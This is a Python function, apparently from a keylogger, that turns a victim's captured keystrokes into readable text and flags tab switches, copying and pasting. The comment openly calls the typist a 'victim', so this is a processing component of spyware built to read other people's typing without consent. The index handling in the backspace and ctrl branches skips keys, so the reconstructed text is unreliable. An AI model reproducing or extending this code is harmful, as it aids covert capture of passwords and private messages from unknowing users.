# Functions to make sense of the keys typed by victim
def input_filter(keys):
    processed_keys = []
    i = 0  # Initialize an index variable to keep track of the current position

    while i < len(keys):
        if keys[i] == "space":
            processed_keys.append(" ")
        elif keys[i] == "enter":
            processed_keys.append("\n")
        elif keys[i] == "backspace":
            if i > 0 and len(processed_keys) != 0:  # Check if it's not at the beginning of the list
                # Remove the previous character and the backspace itself
                processed_keys.pop()
            else:
                i += 1  # Move to the next character without processing backspace
            # In either case, continue to the next character
            i += 1
            continue
        elif keys[i] == "alt":
            # Check if the next keys are "tab"
            tab_count = 0
            while i < len(keys) - 1 and keys[i+1] == "tab":
                tab_count += 1
                i += 1

            if tab_count > 0:
                # Replace the Alt-Tab sequence with the desired message
                alt_tab_message = f"----Switched tab {tab_count} times----\n"
                processed_keys.append(alt_tab_message)
                continue
        elif keys[i] == "ctrl":
            if i+1 < len(keys):
                if keys[i+1] == "c":
                    processed_keys.append("----Copied something----\n")
                    i += 1
                elif keys[i+1] == "v":
                    processed_keys.append("----Pasted something----\n")
                    i += 1
            i += 1

        else:
            processed_keys.append(keys[i])  # Keep other keys unchanged

        i += 1  # Move to the next character
    return "".join(processed_keys)